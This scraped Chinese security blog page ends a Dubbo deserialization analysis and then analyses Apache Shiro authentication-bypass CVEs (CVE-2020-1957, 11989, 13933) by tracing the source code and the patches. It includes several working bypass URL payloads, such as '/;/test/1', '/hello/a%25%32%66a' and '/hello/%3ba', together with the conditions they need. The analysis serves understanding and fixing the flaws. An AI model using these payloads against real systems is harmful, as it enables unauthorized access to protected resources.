<p>​        发送序列化的数据即可利用成功。    <img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915151843418.png" alt="image-20210915151843418"></p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>​        在Dubbo <code>2.7.4</code>或<code>2.6.8 or 2.6.9</code>修复了这个漏洞，我们看下漏洞的修复，首先看下服务导出的变化，在<code>org.apache.dubbo.rpc.protocol.http.HttpProtocol#doExport</code>中，不再使用<code>HttpServiceExporter</code>而是使用<code>JsonRpcServer</code>作为Exporter。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915155904494.png" alt="image-20210915155904494"></p>
<p>​            当我们请求服务时，也不再使用<code>HttpServiceExporter</code>处理请求而是使用<code>JsonRpcBasicServer</code>处理请求。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915161417835.png" alt="image-20210915161417835"></p>
<p>​        <code>handleNode</code>中根据类型的不同做不同的处理。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915161808168.png" alt="image-20210915161808168"></p>
<p>​        从ObjectNode中获取参数和调用方法等信息。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915161849645.png" alt="image-20210915161849645"></p>
<p>​        得到要调用方法的method对象和参数值和实现类的代理对象后调用 invoke方法。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915162441189.png" alt="image-20210915162441189"></p>
<p>​        将参数类型做转换后通过反射完成调用。</p>
<p><img src="/2021/09/08/Dubbo%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210915162626988.png" alt="image-20210915162626988"></p>
<p>​        这个过程中并没有涉及到JAVA本身的反序列化，不过还是涉及到JSON的反序列化操作，使用JACKSON进行反序列化，不过我并不熟悉JACKSON的漏洞，所以先放过吧。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">shiro权限绕过漏洞分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-08-26 17:39:40" itemprop="dateCreated datePublished" datetime="2021-08-26T17:39:40+08:00">2021-08-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-08-31 15:58:44" itemprop="dateModified" datetime="2021-08-31T15:58:44+08:00">2021-08-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞利用</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        之前协助渗透做审计的时候遇到了shiro版本不高，当时想到了shiro的权限绕过漏洞，但是在网上试了好几个payload都没成功 ，现在空下来了分析下shiro权限绕过的原理及触发条件。</p>
<h3 id="为什么会导致权限绕过？"><a href="#为什么会导致权限绕过？" class="headerlink" title="为什么会导致权限绕过？"></a>为什么会导致权限绕过？</h3><p>​        首先观察一下shiro权限绕过的payload为<code>/xx/..;/</code>，并且在官方也强调了是和spring配合使用时出现的问题，不难判断出出现这个问题的原因在于shiro和spring处理url的不一致导致的，而spring在请求处理过程中会去除/./和/;xxxasxdasd/中的内容，通过这种方式变形的url可能和shiro配置的filter不一致，导致了权限绕过。</p>
<h3 id="shiro的认证流程是怎样的？"><a href="#shiro的认证流程是怎样的？" class="headerlink" title="shiro的认证流程是怎样的？"></a>shiro的认证流程是怎样的？</h3><p>​        既然所有的权限绕过的漏洞都是在认证过程中导致的bypass,所有要了解bypass权限认证的关键点在于了解shiro的认证流程。通过大概入门了shiro的流程，发现其实shiro本质上是通过配置filter来对用户请求的url进行认证的。</p>
<p>​        简单配置一个shiro的环境，其中关于Shiro filter的配置是在ShiroFilterFactoryBean中，可以看到这里将拦截的url放到一个map中，通过setFilterChainDefinitionMap设置到filterChainDefinitionMap属性中。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827152142957.png" alt="image-20210827152142957"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827152630930.png" alt="image-20210827152630930"></p>
<p>​        ShiroFilterFactoryBean实现了FactoryBean接口，在spring容器启动时会调用getObject获取对应的bean对象。在<code>ShiroFilterFactoryBean</code>中，通过createInstance创建Bean对象。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827153707698.png" alt="image-20210827153707698"></p>
<p>​        在<code>createInstance</code>中首先获取SecurityManager对象，这个对象是shiro的核心管理器，所有的安全相关的操作都是通过SecurityManager执行的。由于我们在配置ShiroFilterFactoryBean是已经创建了SecurityManager对象，所以这里是不为null的。下来创建了FilterChainManager，FilterChainManager中维护了拦截器链。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827154125758.png" alt="image-20210827154125758"></p>
<p>​        在<code>org.apache.shiro.spring.web.ShiroFilterFactoryBean#createFilterChainManager</code>中，首先通过DefaultFilterChainManager创建默认过滤器。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827154642267.png" alt="image-20210827154642267"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827154739666.png" alt="image-20210827154739666"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827154759289.png" alt="image-20210827154759289"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827154806657.png" alt="image-20210827154806657"></p>
<p>​        下面获取了我们配置的两个过滤器，将这两个过滤器添加到过滤器链，并封装到DefaultFilterChainManager中，最终将过滤器链封装到<code>PathMatchingFilterChainResolver</code>中。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827155309890.png" alt="image-20210827155309890"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827155448065.png" alt="image-20210827155448065"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827155650530.png" alt="image-20210827155650530"></p>
<p>​        通过上面的配置，我们已经拿到了我们配置的过滤器链。现在我们看下请求时过滤器链如何工作。</p>
<p>​        在<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>中，会获取我们配置好的过滤器链，和请求的url进行匹配，匹配成功则创建一个proxy过滤器链，并将匹配到的filter放进去，匹配不到则返回空。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827160122031.png" alt="image-20210827160122031"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827160257002.png" alt="image-20210827160257002"></p>
<pre><code>得到FilterChain后，会调用doFilter过滤方法，也就是调用代理filter的doFilter方法，在代理filter中其实也就是循环调用匹配到的过滤器的doFilter方法。</code></pre><p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827160523409.png" alt="image-20210827160523409"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827160603856.png" alt="image-20210827160603856"></p>
<h3 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h3><h4 id="shiro是如何导致权限绕过的？"><a href="#shiro是如何导致权限绕过的？" class="headerlink" title="shiro是如何导致权限绕过的？"></a>shiro是如何导致权限绕过的？</h4><p>​        经过上面的分析，我猜测绕过的主要原因是在<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>中绕过了url匹配的步骤。下面为了证实我的想法我使用payload进行测试并观察。当我使用<code>/;/test/1</code>请求时，可以看到这里拿到的请求已经发生了变化。按照上面的url请求，其实spring只会去除<code>/;asdasdas/</code>中的内容，并不会将后面的内容去空，而在shiro中已经将;后的内容全部去掉了，这里出现了和spring处理的不一致性。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827161116974.png" alt="image-20210827161116974"></p>
<p>​        而我们得到的requestURI是经过<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getPathWithinApplication</code>处理得到的。其中url获取的部分在<code>WebUtils.getPathWithinApplication</code>，而经过getRequestUri的处理后uri变成了/，所以问题主要出在这个方法中。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827162231558.png" alt="image-20210827162231558"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827162418720.png" alt="image-20210827162418720"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827162357888.png" alt="image-20210827162357888"></p>
<p>​        获取到uri后经过了decodeAndCleanUriString和normalize的处理。在decodeAndCleanUriString中首先对url请求解码，解码后再提取;前的内容作为url，这也是;截断请求的原因。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827162557664.png" alt="image-20210827162557664"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827163326846.png" alt="image-20210827163326846"></p>
<p>​        而normalize中会对请求中的/./或者//或/../进行替换，这也是为什么在shiro中无法通过/./绕过的原因。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827163529708.png" alt="image-20210827163529708"></p>
<p>​        上面我们分析的是shiro是如何处理uri的，但是这个权限绕过还有一个前提，就是spring在去请求具体的controller时，请求的不是shiro处理后的uri。经过调试可以看到<code>org.springframework.web.util.UrlPathHelper#getRequestUri</code>中spring并没有获取shiro处理后的url做匹配。接下来spring会通过移除/;/的内容，并导致我们可以请求到/test/1这个路由。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827164609076.png" alt="image-20210827164609076"></p>
<h4 id="还有没有其他绕过方法？"><a href="#还有没有其他绕过方法？" class="headerlink" title="还有没有其他绕过方法？"></a>还有没有其他绕过方法？</h4><p>1.<code>/.;/test/1</code></p>
<p>​        这个url会被shiro当作/.识别，在spring中经过decodeAndCleanUriString处理后会变成<code>/./test/1</code>,再通过<code>org.springframework.web.util.UrlPathHelper#getServletPath</code>处理，会变成/test/1，因此这种变形也可以实现。</p>
<p><code>/..;/test/1</code>无法绕过，直接使用这种方式在tomcat处理时就会报错。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827171047564.png" alt="image-20210827171047564"></p>
<ol start="2">
<li><p><code>/aaa/..;/test/1</code></p>
<p>​    这个url经过shiro处理后，会变成<code>/aaa/..</code>，当然匹配不到任何过滤器，在spring中经过处理会变成<code>/aaa/../test/1</code>，最后经过getServletPath处理后转成<code>/test/1</code>最终执行请求。</p>
</li>
</ol>
<h4 id="绕过的条件？"><a href="#绕过的条件？" class="headerlink" title="绕过的条件？"></a>绕过的条件？</h4><p>​        虽然看上去很多配置都可以绕过，但是其实和shiro的config配置有关，经过上面的分析，我们的能绕过的请求在shiro处理后会变成下面几种形式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. &#x2F;</span><br><span class="line">2. &#x2F;.</span><br><span class="line">3. &#x2F;xxx&#x2F;..</span><br></pre></td></tr></table></figure>

<p>​        如果在使用shiro时，做了这样的配置<code>map.put(&quot;/**&quot;, &quot;authc&quot;);</code>,那么无论怎么接收的url是什么样的，也会被shiro的过滤器匹配到，所以这么配置的shiro是无法绕过的。</p>
<h4 id="如何修复这个漏洞？"><a href="#如何修复这个漏洞？" class="headerlink" title="如何修复这个漏洞？"></a>如何修复这个漏洞？</h4><p>​        在高版本中，主要修复代码如下：</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827173349412.png" alt="image-20210827173349412"></p>
<p>​        这里不再直接对用户传入的url进行处理了，而是通过getServletPath处理后再经过removeSemicolon的处理。getServletPath是通过request.getServletPath获取的。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827173514501.png" alt="image-20210827173514501"></p>
<p>​        而之前分析请求绕过，其实spring最终决定哪个url匹配是通过getServletPath获取的，也是通过request.getServletPath获取的。这里就保证了处理的url的一致性，也就没办法绕过了。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827173709263.png" alt="image-20210827173709263"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210827173732079.png" alt="image-20210827173732079"></p>
<h3 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h3><h4 id="为什么可以通过这种方式绕过？"><a href="#为什么可以通过这种方式绕过？" class="headerlink" title="为什么可以通过这种方式绕过？"></a>为什么可以通过这种方式绕过？</h4><p>​        通过上一个权限绕过的分析，想要绕过shiro的权限认证，其实本质上也是绕过了filter的正则匹配。这个洞本质上来讲也是绕过了权限匹配。首先，根据<code>https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</code>的描述,只有在满足特定的条件下，才能导致权限绕过的漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 使用map.put(&quot;&#x2F;hello&#x2F;*&quot;, &quot;authc&quot;); 而不是map.put(&quot;&#x2F;hello&#x2F;**&quot;, &quot;authc&quot;);</span><br><span class="line">2. 只能使用@PathVariable的方式接收请求。</span><br></pre></td></tr></table></figure>

<p>​        首先了解下在shiro中配置<em>和*</em>的区别</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*表示&#x2F;后的一个或多个字符串，也就是&#96;&#x2F;hello&#x2F;aa&#x2F;x&#96;这种是匹配不到的</span><br><span class="line"></span><br><span class="line">**匹配0个或者多个路径，&#96;&#x2F;hello&#x2F;aa&#x2F;x&#96;可以正常匹配</span><br></pre></td></tr></table></figure>

<p>​    下面看下使用<code>/hello/*</code>是怎么进行路径匹配的，匹配路由的逻辑还是在<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>中。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830112915448.png" alt="image-20210830112915448"></p>
<p>​    其中主要在<code>org.apache.shiro.util.AntPathMatcher#doMatch</code>中完成匹配，通过/将路径分割，并将分割后的路径分组后依次匹配，匹配成功则增加<code>pattIdxStart</code>计数，否则直接return fasle结束。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830114802113.png" alt="image-20210830114802113"></p>
<p>​    下面有个比较重要的判断，当<code>pathIdxStart</code>和<code>pattIdxEnd</code>不一致时，也会返回false。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830115145893.png" alt="image-20210830115145893"></p>
<p>​    比如当我请求<code>/hello/aaaa/111</code>时，就会导致这种不一致。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830115729159.png" alt="image-20210830115729159"></p>
<p>​        虽然使用<code>/hello/aa/11</code>这种语法可以绕过shiro的过滤器，但是同样不会被Spring匹配到，因为spring这里只使用了一个参数。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830115817072.png" alt="image-20210830115817072"></p>
<p>​        所以有没有什么方法可以让shiro在匹配时当作两个参数，而在spring接收时当作一个。我们知道spring在处理时的url是和<code>request.getServletPath()</code>对应的路径是一致的。而在修复方案中，确实已经通过接收<code>request.getServletPath()</code>来当作shiro的处理路径了，但是这里有个问题，就是shiro在接收到<code>request.getServletPath()</code>的路径后还通过<code>decodeAndCleanUriString</code>进行了一次url解码。所以只要让<code>request.getServletPath()</code>接收到的是url编码后的值就可以产生不一致导致到绕过。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830120454769.png" alt="image-20210830120454769"></p>
<p>​        payload如下:<code>/hello/a%25%32%66a</code></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830120952394.png" alt="image-20210830120952394"></p>
<h4 id="为什么只能使用-PathVariable的方式绕过？"><a href="#为什么只能使用-PathVariable的方式绕过？" class="headerlink" title="为什么只能使用@PathVariable的方式绕过？"></a>为什么只能使用<code>@PathVariable</code>的方式绕过？</h4><p>​        虽然使用上面的方式确实绕过了shiro的权限认证，但是我们想想，spring在处理请求时还是通过<code>request.getServletPath()</code>的结果处理的，而如果我们使用编码的方式绕过，spring最终接收到的url是<code>/hello/a%2fa</code>，其中包含了一个url编码后的值，那么如果我们使用<code>@RequestMapping</code>指定值<code>xxx</code>来接收，一定是匹配不到任何路由的。所以在<code>/hello</code>后只能是一个变量，所以这也就是只能使用<code>@PathVariable</code>的原因。而且由于我们接收的内容中有url编码后的内容，后端如果拿到这个内容进行处理会报错，所以如果想控制这个<code>@PathVariable</code>的内容来做某些操作也是不行的，所以这个漏洞虽然是一个CVE，但是在实际利用时是没什么用的，除非通过<code>@PathVariable</code>接收到内容后不使用，但是这与开发者使用<code>@PathVariable</code>来接收内容的本意肯定是不符的。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830122047766.png" alt="image-20210830122047766"></p>
<h4 id="如何修复这个漏洞？-1"><a href="#如何修复这个漏洞？-1" class="headerlink" title="如何修复这个漏洞？"></a>如何修复这个漏洞？</h4><p>​        Shiro在1.5.3版本在获取到servletPath后不再使用url解码。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830122328775.png" alt="image-20210830122328775"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830122417293.png" alt="image-20210830122417293"></p>
<h3 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h3><h4 id="为什么可以绕过？"><a href="#为什么可以绕过？" class="headerlink" title="为什么可以绕过？"></a>为什么可以绕过？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;hello&#x2F;%3ba</span><br></pre></td></tr></table></figure>

<p>​        根据之前的经验，绕过的还是<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>的匹配。这里可以看到我们的输入被处理为<code>/hello</code>，这里根据<code>CVE-2020-11989</code>的经验，这里会由于<code>pathIdxStart</code>和<code>pattIdxEnd</code>不一致而导致匹配不上。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830150721752.png" alt="image-20210830150721752"></p>
<p>​        而在<code>request.getServletPath</code>获取的路径仍然是<code>/hello/;a</code>，这里又导致了解析url不一致的问题。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830151104307.png" alt="image-20210830151104307"></p>
<p><strong>为什么请求会转为<code>/hello</code>?</strong></p>
<p>​            在获取servletpath后，会通过<code>removeSemicolon</code>移除<code>;</code>后的内容,所以此时url变为<code>/hello/</code>。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830151357783.png" alt="image-20210830151357783"></p>
<p>​        在<code>getChains</code>方法中，当匹配url以/结尾，会去除末尾的/。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830151618993.png" alt="image-20210830151618993"></p>
<h4 id="漏洞利用条件是什么？"><a href="#漏洞利用条件是什么？" class="headerlink" title="漏洞利用条件是什么？"></a>漏洞利用条件是什么？</h4><p>​        通过上面的分析，上述利用方式是<code>CVE-2020-11989</code>的变形，所以利用条件还是需要通配符使用<code>*</code>而不是<code>**</code>，通过下面的demo可以证明。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830153207009.png" alt="image-20210830153207009"></p>
<p>​        同理，也需要<code>@PathVariable</code>,<code>;</code>也会被带入到变量中，想要通过控制变量的内容深入利用是不行的。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210830154607102.png" alt="image-20210830154607102"></p>
<h4 id="为什么需要对-进行url编码？"><a href="#为什么需要对-进行url编码？" class="headerlink" title="为什么需要对;进行url编码？"></a>为什么需要对;进行url编码？</h4><p>​        通过上面的分析，我们即使不给<code>;</code>编码，同样可以绕过shiro的匹配，那么为什么要给<code>;</code>进行url编码呢？</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831133945380.png" alt="image-20210831133945380"></p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831134020818.png" alt="image-20210831134020818"></p>
<p>​        下面我们回顾下SpringMVC的处理流程，当发起一个请求到达SpringMVC，首先会经过<code>DispatcherServlet#doDispatch</code>,由<code>this.getHandler(processedRequest);</code>获取对应的Handler,再通过Handler.handle方法处理请求，最后将返回的ModelAndView对象交给视图解析器解析后返回。</p>
<p>​        所以请求被哪个Handler处理取决于如何根据URL匹配到对应Handler的，这个过程在getHandler中执行，handlerMappings包含多个<code>HandlerMapping</code>,SpringMVC会循环调用<code>HandlerMapping.getHandler</code>方法，直到获取到一个handler。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831141511815.png" alt="image-20210831141511815"></p>
<p>​        而我们通过<code>@RequestMapping</code>注册的方法是由<code>RequestMappingHandlerMapping</code>来处理的，所以我们主要关注<code>RequestMappingHandlerMapping.getHandler</code>方法，由于这个类没有getHandler方法， 所以会执行父类<code>AbstractHandlerMapping.getHandler</code>方法，在这个方法中，通过<code>getHandlerInternal</code>获取handler。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831142024408.png" alt="image-20210831142024408"></p>
<p>​    <code>AbstractHandlerMethodMapping#getHandlerInternal</code>首先获取requestPath，再调用<code>lookupHandlerMethod</code>查找path对应的HadlerMethod，在springMVC启动时，会将<code>@RequestMapping</code>修饰的方法注册为HandlerMethod。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831142355307.png" alt="image-20210831142355307"></p>
<p>​        <code>lookupHandlerMethod</code>还有一些复杂的方法调用，最终交给<code>org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPatterns</code>完成请求url和RequestMapping 设置的请求路径的匹配。</p>
<p><img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831143300867.png" alt="image-20210831143300867"></p>
<p>​        当<code>;</code>没有编码时，Spring在处理过程中会将;及其之后的内容替换为空，所以得到的lookupPath为<code>/hello/</code>,这是匹配不到<code>/hello/{name}</code>的。<img src="/2021/08/26/shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210831143516034.png" alt="image-20210831143516034"></p>
<p>​        而当<code>;</code>编码后，这里得到的lookupPath为<code>/hello/;test</code>是可以匹配到的，才能交给对应的方法处理。</p>
